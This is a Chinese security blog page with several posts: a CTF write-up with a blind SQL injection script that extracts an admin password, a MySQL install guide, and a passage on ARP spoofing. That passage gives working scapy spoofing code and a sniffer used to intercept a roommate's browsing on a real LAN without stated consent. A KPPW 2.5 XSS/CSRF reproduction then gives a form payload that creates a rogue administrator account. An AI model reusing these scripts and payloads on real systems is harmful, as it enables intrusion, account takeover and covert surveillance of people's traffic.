              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T10:53:49+08:00">
                2018-03-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index">
                    <span itemprop="name">ctf</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p>
<h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p>
<p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p>
<pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;
</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p>
<p><strong>题目的第二个提示</strong></p>
<pre><code>the flag is `admin&apos;s password`:)
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p>
<pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)
</code></pre><p><strong>数据库语句变为:</strong></p>
<pre><code>update users set points=任意数字 and （构造逻辑判断）
</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p>
<pre><code>import requests
import string
list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用
url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面
#read password
#i=0
#while 1:
#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}
#    html=requests.post(url=url,data=payload).content
#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break
#        print i
#        break
#    else:
#        i=i+1
#password length is 13
#read password
i=0
for i in range(1,14):
    for j in list:
        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}
        html=requests.post(url=url,data=payload).content
        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break
            print j
            break
#flag is HE3L3LOCAT233
</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p>
<p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p>
<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p>
<p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/27/centos7mysql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/27/centos7mysql/" itemprop="url">centos7安装mysql</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-27T22:34:28+08:00">
                2018-02-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/其他/" itemprop="url" rel="index">
                    <span itemprop="name">其他</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="centos7安装mysql"><a href="#centos7安装mysql" class="headerlink" title="centos7安装mysql"></a>centos7安装mysql</h1><p><strong>由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql</strong></p>
<p><strong>1.卸载之前安装的MariaDB</strong></p>
<pre><code>rpm -qa | grep mariadb(列出所有被安装的rpm package)
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG" alt="mark"><br><strong><code>rpm -e</code>依次卸载</strong></p>
<pre><code>rpm -e mariadb-5.5.56-2.el7.x86_64
rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64
rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64
</code></pre><p><strong>2.到<a href="https://dev.mysql.com/downloads/repo/yum/" title="mysql官网" target="_blank" rel="external">mysql官网</a>找到对应版本的mysql下载（本例中为mysql57-community-release-el7-11.noarch.rpm），上传至服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/Fdg5fbh339.png?imageslim" alt="mark"></p>
<p><strong>3.下载完毕后输入<code>md5sum mysql57-community-release-el7-9.noarch.rpm</code>生成MD5值并确保同官方网站上的MD5值相同。注意：建议运行此命令以确保文件无损坏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/B3fC28IJjm.png?imageslim" alt="mark"></p>
<p><strong>4.输入<code>rpm -ivh mysql57-community-release-el7-9.noarch.rpm</code>并按回车键进行安装YUM源RPM安装包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/BkFBCkAj2I.png?imageslim" alt="mark"></p>
<p><strong>5.因上一步已添加新的YUM存储库，所以直接就可以用yum命令安装mysql了</strong></p>
<pre><code>yum install -y mysql-server
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/2jih4JIeeF.png?imageslim" alt="mark"></p>
<p><strong>6.可以看到mysql已经成功安装</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/3iAGB7h54A.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/lG0d7L9Dc7.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/12/arpattack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/12/arpattack/" itemprop="url">arp协议分析&python编程实现arp欺骗抓图片</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-12T22:24:48+08:00">
                2018-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/无线安全/" itemprop="url" rel="index">
                    <span itemprop="name">无线安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="arp协议分析-amp-python编程实现arp欺骗抓图片"><a href="#arp协议分析-amp-python编程实现arp欺骗抓图片" class="headerlink" title="arp协议分析&amp;python编程实现arp欺骗抓图片"></a>arp协议分析&amp;python编程实现arp欺骗抓图片</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>学校tcp/ip协议分析课程老师布置的任务，要求分析一种网络协议并且研究安全问题并编程实现，于是我选择了研究arp协议，并且利用python编程实现一次简单的局域网arp攻击，抓取室友网上浏览的图片（滑稽脸）</strong></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p>
<p><strong>2.python2.7.13，kali2.0自带</strong></p>
<p><strong>3.一个局域网和室友的电脑</strong></p>
<p><strong>4.kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持</strong></p>
<p><strong>选择kali支持的无线网卡可参考链接</strong><br><code>http://www.freebuf.com/articles/wireless/140065.html</code></p>
<p><strong>不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错</strong></p>
<h3 id="arp协议研究"><a href="#arp协议研究" class="headerlink" title="arp协议研究"></a>arp协议研究</h3><p><strong>在进行arp攻击之前，先来研究一下arp协议</strong></p>
<p><strong>arp协议简介：arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议</strong></p>
<p><strong>这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。因为在OSI七层模型中，ip地址在第三层网络层，传送的是数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系</strong></p>
<p><strong>arp协议数据包</strong></p>
<p><strong>arp数据包分为arp请求包和arp响应包，数据包格式如下图，arp数据包长度为28字节</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG" alt="mark"><br><strong>其中op段代表操作类型，当op为1代表发起arp请求，说明这是一个arp请求包，当op为2时代表发起arp响应，说明这是一个arp响应包，现在假设局域网的一台机器要上外网（比如百度），首先要与网关进行通讯，获取网关的物理地址后才能传送数据通过网关访问外网，这台机器会首先查看自己电脑的arp缓存表（缓存时间为120s）中是否有网关的物理地址，如果没有便会向局域网内的机器以广播的形式发送arp请求包询问网管的物理地址，请求包主要字段如下</strong></p>
<pre><code>op:1(op值为1说明这是一次arp请求)
hwsrc：发送方MAC地址（即本机器MAC地址）
psrc：发送方ip地址（即本机内网ip地址）
hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）
pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）
</code></pre><p><strong>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（即网关MAC地址）
psrc：发送方ip地址（即网关ip地址）
hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）
pdst：目标ip地址（为发起arp请求的机器的ip地址）
</code></pre><p><strong>这样发起arp请求的机器从arp响应包里获取MAC地址并添加到本机arp缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送arp请求的同时，网关也会向本机发送arp请求获取本机MAC地址，同时本机也会向网关发送arp响应，这时一个双向的过程，这里不再重复</strong></p>
<p><strong>接下来为了更清楚的理解，用wireshark抓包来观察一下arp请求包和响应包</strong></p>
<p><strong>选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机ip为192.168.0.106，网关ip为192.168.0.1</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/1GLmkkH2Ai.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/k2IclB0dDa.PNG" alt="mark"><br><strong>在过滤窗口输入arp&amp;&amp;ip.addr==192.168.0.1将arp数据包过滤出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/h94m4kFC49.png?imageslim" alt="mark"><br><strong>观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明</strong></p>
<p><strong>arp请求包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/6b1bI0Heb0.png?imageslim" alt="mark"><br><strong>arp响应包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/EIckd61cHh.png?imageslim" alt="mark">)</p>
<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p><strong>上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器</strong></p>
<pre><code>网关:192.168.0.1
受害者机器：192.168.0.108
本机kali：192.168.0.106
</code></pre><p><strong>正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（攻击者MAC地址）
psrc：发送方ip地址（网关ip地址）
hwdst：目标MAC地址（受害者MAC地址）
pdst：目标ip地址（受害者ip地址）
</code></pre><p><strong>在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击</strong></p>
<p><strong>arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下</strong></p>
<pre><code>op:2(op值为2说明这是一次arp响应)
hwsrc：发送方MAC地址（攻击者MAC地址）
psrc：发送方ip地址（受害者ip地址）
hwdst：目标MAC地址（网关MAC地址）
pdst：目标ip地址（网关ip地址）
</code></pre><p><strong>同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量</strong></p>
<h3 id="用python实现arp攻击"><a href="#用python实现arp攻击" class="headerlink" title="用python实现arp攻击"></a>用python实现arp攻击</h3><p><strong>所需的python第三方库</strong></p>
<p><strong>scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带</strong></p>
<pre><code>pip install scapy
</code></pre><p><strong>模拟攻击环境,一个真实的局域网，就是我们寝室</strong></p>
<pre><code>自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡
室友的电脑:192.168.0.108，连接同一路由器的无线网
网关：192.168.0.1
</code></pre><p><strong>编写python代码：arpattack.py</strong></p>
<pre><code>from scapy.all import *#导入scapy模块
from optparse import OptionParser#导入命令行参数处理模块optparse
import sys
def main():
    usage=&quot;Usage: [-i interface] [-t targetip] [-g gatewayip]&quot;
    parser=OptionParser(usage)
    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)#-i 所选择的网卡，eth0或wlan0，存放在interface变量中
    parser.add_option(&apos;-t&apos;,dest=&apos;targetip&apos;,help=&apos;select ip to spoof&apos;)#-t 要攻击的ip，存放在targetip变量中
    parser.add_option(&apos;-g&apos;,dest=&apos;gatewayip&apos;,help=&apos;input gateway ip&apos;)#-g 网关ip，存放在gatewayip变量中
    (options,args)=parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface=options.interface
        tip=options.targetip
        gip=options.gatewayip
        spoof(interface,tip,gip)#将参数传给spoof函数
    else:
        parser.print_help()#显示帮助
        sys.exit(0)
def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击
    localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址
    tmac=getmacbyip(tip)#根据目标ip获取其MAC地址
    gmac=getmacbyip(gip)#根据网关ip获取其MAC地址
    ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址
    pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址
    try:
        while 1:
            sendp(ptarget,inter=2,iface=interface)
            print &quot;send arp reponse to target(%s),gateway(%s) macaddress is %s&quot;%(tip,gip,localmac)
            sendp(pgateway,inter=2,iface=interface)
            print &quot;send arp reponse to gateway(%s),target(%s) macaddress is %s&quot;%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
    except KeyboardInterrupt:
        sys.exit(0)
if __name__==&apos;__main__&apos;:
    main()
</code></pre><p><strong>脚本使用到的scapy库中的几个函数</strong></p>
<pre><code>get_if_hwaddr(&quot;本地网卡名称（eth0/wlan0）&quot;)    根据所选择的本地网卡获取相应的本地网卡的MAC地址
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/JgBhi3KHgJ.PNG" alt="mark"></p>
<pre><code>getmacbyip（&quot;ip地址&quot;）    根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/KLm017GgK4.PNG" alt="mark"><br>    ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部</p>
<pre><code>Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2)
构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MAC

Ether(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2)
构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MAC

sendp函数发送我们构造的arp数据包    sendp(数据包, inter=2, iface=网卡)    sendp函数工作在网络的第二层
</code></pre><p><strong>以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入</strong></p>
<pre><code>python arpattack.py -h
</code></pre><p><strong>查看脚本使用帮助</strong></p>
<pre><code>Usage: [-i interface] [-t targetip] [-g gatewayip]

Options:
    -h, --help    show this help message and exit
    -i INTERFACE  select interface(input eth0 or wlan0 or more)
    -t TARGETIP   select ip to spoof
    -g GATEWAYIP  input gateway ip
</code></pre><p><strong>所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击</strong></p>
<pre><code>python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip
</code></pre><p><strong>输入</strong></p>
<pre><code>python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1
</code></pre><p><strong>选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0</strong></p>
<p><strong>运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/fg0BD08D09.PNG" alt="mark"><br><strong>室友电脑arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/I4CghAgijh.jpg?imageslim" alt="mark"><br><strong>路由器arp缓存</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180114/BDFcg2j7ED.png?imageslim" alt="mark"><br><strong>这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网</strong></p>
<pre><code>echo &quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward
</code></pre><p><strong>开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡</strong></p>
<p><strong>接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将<code>http://*.jpg</code>筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包</strong></p>
<pre><code>apt-get install libpcap-dev

pip install pypcap

pip install dpkt
</code></pre><p><strong>安装pcap库和dpkt库</strong></p>
<p><strong>pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象</strong></p>
<p><strong>dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包</strong></p>
<p><strong>python代码如下stealimg.py</strong></p>
<pre><code>import pcap
import dpkt
import re
import requests
from PIL import Image
from io import BytesIO
from optparse import OptionParser
import sys
urllist=[]
def main():
    usage=&quot;Usage: [-i interface]&quot;
    parser=OptionParser(usage)
    parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)
    (options,args)=parser.parse_args()
    if options.interface:
        interface=options.interface
        pc=pcap.pcap(interface)
        pc.setfilter(&apos;tcp port 80&apos;)
        for ptime,pdata in pc:
            getimg(pdata)
    else:
        parser.print_help()
        sys.exit(0)
def getimg(pdata):
    global urllist
    p=dpkt.ethernet.Ethernet(pdata)
    if p.data.__class__.__name__==&apos;IP&apos;:
        if p.data.data.__class__.__name__==&apos;TCP&apos;:
            if p.data.data.dport==80:
                pa=re.compile(r&apos;GET (.*?\.jpg)&apos;)#|.*?\.png|.*?\.gif
                img=re.findall(pa,p.data.data.data)
                if img!=[]:
                    lines=p.data.data.data.split(&apos;\n&apos;)
                    for line in lines:
                        if &apos;Host:&apos; in line:
                            url=&apos;http://&apos;+line.split(&apos;:&apos;)[-1].strip()+img[-1]
                            if url not in urllist:
                                urllist.append(url)
                                if &apos;Referer:&apos; in p.data.data.data:
                                    for line in lines:
                                        if &apos;Referer:&apos; in line:
                                            referer=line.split(&apos;:&apos;)[-1].strip()
                                            print url
                                            r=requests.get(url,headers={&apos;Referer&apos;:referer})
                                            img=Image.open(BytesIO(r.content))
                                            img.show()
                                else:
                                    r=requests.get(url)
                                    img=Image.open(BytesIO(r.content))
                                    img.show()
                            else:
                                pass
if __name__==&apos;__main__&apos;:
    main()  
</code></pre><p><strong>代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下</strong></p>
<p><strong>室友电脑浏览图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/lE1kD92EB0.jpg?imageslim" alt="mark"><br><strong>自己kali可以窥屏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180116/kI9l6IkGka.jpg?imageslim" alt="mark"></p>
<p><strong>注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/12/KPPW25xss/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/12/KPPW25xss/" itemprop="url">KPPW2.5XSS引起的CSRF</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-12T09:45:22+08:00">
                2018-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="kppw2-5XSS漏洞复现（可csrf）"><a href="#kppw2-5XSS漏洞复现（可csrf）" class="headerlink" title="kppw2.5XSS漏洞复现（可csrf）"></a>kppw2.5XSS漏洞复现（可csrf）</h1><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send
</code></pre><p><strong>收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf</strong></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send
</code></pre><p><strong>收件人填写admin（网站管理员），向管理员提交私信，内容为我们构造的html代码</strong></p>
<pre><code>&lt;form action=&quot;http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=
&quot; method=&quot;post&quot;&gt;
    &lt;input type=hidden name=&quot;edituid&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[username]&quot; value=&quot;qianlan&quot;&gt;
    &lt;input type=hidden name=&quot;fds[truename]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[phone]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[qq]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[indus_pid]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[indus_id]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[birthday]&quot; value=&quot;&quot;&gt;
    &lt;input type=hidden name=&quot;fds[password]&quot; value=&quot;newadmin&quot;&gt;
    &lt;input type=hidden name=&quot;fds[email]&quot; value=&quot;x@q.c&quot;&gt;
    &lt;input type=hidden name=&quot;fds[group_id]&quot; value=&quot;1&quot;&gt;
    &lt;input type=&quot;submit&quot; name=&quot;is_submit&quot; value=&quot;1&quot;&gt;
&lt;/form&gt;
